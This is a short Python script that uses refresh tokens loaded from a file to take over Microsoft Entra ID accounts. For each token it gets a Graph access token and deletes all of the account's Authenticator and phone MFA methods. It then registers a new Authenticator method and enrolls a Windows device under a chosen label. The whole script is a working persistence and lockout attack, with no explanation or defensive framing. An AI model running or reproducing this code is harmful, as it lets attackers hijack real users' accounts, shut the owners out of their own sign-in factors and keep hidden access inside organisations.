import json
import os

import requests

with open(os.environ["TOKEN_FILE"], encoding="utf-8") as fh:
    records = [json.loads(line) for line in fh if line.strip()]

for record in records:
    resp = requests.post(
        f"https://login.microsoftonline.com/{record['tenant']}/oauth2/v2.0/token",
        data={
            "grant_type": "refresh_token",
            "client_id": "29d9ed98-a469-4536-ade2-f981bc1d605e",
            "refresh_token": record["refresh_token"],
            "scope": "https://graph.microsoft.com/.default offline_access",
        },
        timeout=20,
    )
    token = resp.json()
    if "access_token" not in token:
        continue
    headers = {"Authorization": "Bearer " + token["access_token"]}

    methods = requests.get(
        "https://graph.microsoft.com/v1.0/me/authentication/microsoftAuthenticatorMethods",
        headers=headers, timeout=20,
    ).json()
    for method in methods.get("value", []):
        requests.delete(
            f"https://graph.microsoft.com/v1.0/me/authentication/microsoftAuthenticatorMethods/{method['id']}",
            headers=headers, timeout=20,
        )
    for method in requests.get(
        "https://graph.microsoft.com/v1.0/me/authentication/phoneMethods",
        headers=headers, timeout=20,
    ).json().get("value", []):
        requests.delete(
            f"https://graph.microsoft.com/v1.0/me/authentication/phoneMethods/{method['id']}",
            headers=headers, timeout=20,
        )
    requests.post(
        "https://graph.microsoft.com/v1.0/me/authentication/microsoftAuthenticatorMethods",
        headers=headers,
        json={
            "@odata.type": "#microsoft.graph.microsoftAuthenticatorAuthenticationMethod",
            "deviceTag": "SoftwareTokenActivated",
            "phoneAppVersion": "6.8.1",
            "displayName": record["device_label"],
        },
        timeout=20,
    )

    drs = requests.post(
        f"https://login.microsoftonline.com/{record['tenant']}/oauth2/v2.0/token",
        data={
            "grant_type": "refresh_token",
            "client_id": "d3590ed6-52b3-4102-aeff-aad2292ab01c",
            "refresh_token": token["refresh_token"],
            "scope": "01cb2876-7ebd-4aa4-9cc9-d28bd4d359a9/.default",
        },
        timeout=20,
    ).json()
    if "access_token" in drs:
        requests.post(
            f"https://enterpriseregistration.windows.net/{record['tenant']}/EnrollmentServer/device/",
            headers={"Authorization": "Bearer " + drs["access_token"]},
            json={"DeviceDisplayName": record["device_label"], "OperatingSystem": "Windows"},
            timeout=20,
        )
